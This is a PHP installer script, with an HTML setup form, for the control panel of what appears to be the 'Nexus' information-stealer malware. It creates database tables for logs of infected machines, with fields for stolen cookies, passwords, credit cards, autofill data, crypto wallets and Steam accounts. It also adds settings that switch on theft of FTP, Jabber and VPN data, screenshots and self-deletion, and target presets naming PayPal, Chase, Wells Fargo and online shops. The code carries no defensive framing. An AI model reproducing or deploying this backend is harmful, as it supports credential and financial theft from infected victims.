<?php
ini_set('display_errors', 'On');
error_reporting(E_ALL);

if(isset($_GET['submit'])){
    $dbname=$_GET['dbname'];
    $dbhost=$_GET['dbhost'];
    $dbuser=$_GET['dbuser'];
    $dbpass=$_GET['dbpass'];
    $user=$_GET['name'];
    $pass=$_GET['pass'];
    try {
        $db = new  PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
    }catch(Exception $e){
	echo "ohshit";
        $db=NULL;
    }
    if($db){
        $db->query("SET SQL_MODE = \"NO_AUTO_VALUE_ON_ZERO\";");
        $db->query("SET time_zone = \"+00:00\";");
        $db->query("CREATE TABLE `grabber` (
            `id` int(11) NOT NULL,
            `name` text NOT NULL,
            `folder` text NOT NULL,
            `pattern` text NOT NULL,
            `exception` text NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");

        $db->query("CREATE TABLE `logs` (
            `id` int(11) NOT NULL,
            `userID` text NOT NULL,
            `hwid` text NOT NULL,
            `system` text NOT NULL,
            `ip` text NOT NULL,
            `country` text NOT NULL,
            `date` text NOT NULL,
            `count` int(11) DEFAULT NULL,
            `cookie` int(11) DEFAULT NULL,
            `pswd` int(11) DEFAULT NULL,
            `buildversion` text,
            `credit` int(11) DEFAULT '0',
            `autofill` int(11) DEFAULT '0',
            `wallets` int(11) DEFAULT '0',
            `checked` int(11) NOT NULL DEFAULT '0',
            `comment` text NOT NULL,
            `preset` text,
            `steam` INT DEFAULT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");

        $db->query("CREATE TABLE `presets` (
            `id` int(11) NOT NULL,
            `name` text NOT NULL,
            `color` text NOT NULL,
            `pattern` text NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");

        $db->query("INSERT INTO `presets` (`id`, `name`, `color`, `pattern`) VALUES
            (1, 'Shop', 'green', 'amazon;ebay;walmart;newegg;apple;bestbuy'),
            (2, 'Money', 'GOLD', 'paypal;chase.com;TD;wells;capitalone;skrill;PayU');");

        $db->query("CREATE TABLE `tasks` (
            `id` int(11) NOT NULL,
            `name` text NOT NULL,
            `count` int(11) NOT NULL,
            `country` text NOT NULL,
            `task` text NOT NULL,
            `preset` text NOT NULL,
            `params` text NOT NULL,
            `status` int(11) NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8;");

	$db->query("CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `cisLogs` text NOT NULL,
  `repeatLogs` text NOT NULL,
  `telegram` text NOT NULL,
  `history` text NOT NULL,
  `autocomplete` text NOT NULL,
  `cards` text NOT NULL,
  `cookies` text NOT NULL,
  `passwords` text NOT NULL,
  `jabber` text NOT NULL,
  `ftp` text NOT NULL,
  `screenshot` text NOT NULL,
  `selfDelete` text NOT NULL,
  `vpn` text NOT NULL,
  `grabber` text NOT NULL,
  `executionTime` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;");

$db->query("INSERT INTO `settings` (`id`, `cisLogs`, `repeatLogs`, `telegram`, `history`, `autocomplete`, `cards`, `cookies`, `passwords`, `jabber`, `ftp`, `screenshot`, `selfDelete`, `vpn`, `grabber`, `executionTime`) VALUES
(0, 'on', 'on', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', '0');
");


        $db->query("CREATE TABLE `usr` (
            `name` TEXT NOT NULL,
            `pass` TEXT NOT NULL);");

        $db->query("ALTER TABLE `grabber` ADD PRIMARY KEY (`id`);");

        $db->query("ALTER TABLE `logs` ADD PRIMARY KEY (`id`);");

        $db->query("ALTER TABLE `presets`
            ADD PRIMARY KEY (`id`),
            ADD UNIQUE KEY `id` (`id`),
            ADD UNIQUE KEY `id_2` (`id`);");

        $db->query("ALTER TABLE `settings` ADD PRIMARY KEY (`id`);");

        $db->query("ALTER TABLE `tasks` ADD PRIMARY KEY (`id`);");

        $db->query("ALTER TABLE `grabber` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;");

        $db->query("ALTER TABLE `logs` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=268;");

        $db->query("ALTER TABLE `presets` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;");

        $db->query("ALTER TABLE `tasks` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;");

        $e=sha($user,$pass);
        $db->query("INSERT INTO `usr` (`name`, `pass`) VALUES ('$user', '$e');");

        $fd = fopen("database.php", 'w');
        $content = "<?php
\$user =\"$dbuser\";
\$password=\"$dbpass\";
\$host=\"$dbhost\";
\$db_name=\"$dbname\";
\$pdoConnection= new  PDO(\"mysql:host=\$host;dbname=\$db_name\", \$user, \$password);
?>";
        fwrite($fd, $content);
        fclose($fd);
        header("Location:index.php", true, 301);
    }
}

function sha($user,$p){
    $method = 'aes-128-ctr';
    $key = openssl_digest($user, 'SHA256', TRUE);
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($method));
    $crypt = openssl_encrypt($p, $method, $key, 0, $iv) . "::" . bin2hex($iv);
    unset($token,$method, $key, $iv);
    return $crypt;
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="css/i.css">
    <title>Nexus:Installation</title>

</head>
<body>
<form>
    <div>
        <p>
            <label>Database name</label>
            <input type="text" name="dbname" required pattern="[A-za-z0-9_]+" placeholder="nexus"><span></span>
        </p>

        <p>
            <label>Database address</label>
            <input type="text" name="dbhost" required pattern="[A-za-z0-9\W]+" placeholder="localhost"><span></span>
        </p>

        <p>
            <label>Database user</label>
            <input type="text" name="dbuser" required pattern="[A-za-z0-9_]+" placeholder="root"><span></span>
        </p>

        <p>
            <label>Database password</label>
            <input type="password" name="dbpass" required ><span></span>
        </p>

        <p>
            <label>Username</label>
            <input type="text" name="name"  required  placeholder="user_123"><span></span>
        </p>

        <p>
            <label>Password</label>
            <input type="password" name="pass" required ><span></span>
        </p>
    </div>
    <footer>
        <button type="submit" name="submit">Install</button>
    </footer>
</form>
</body>
</html>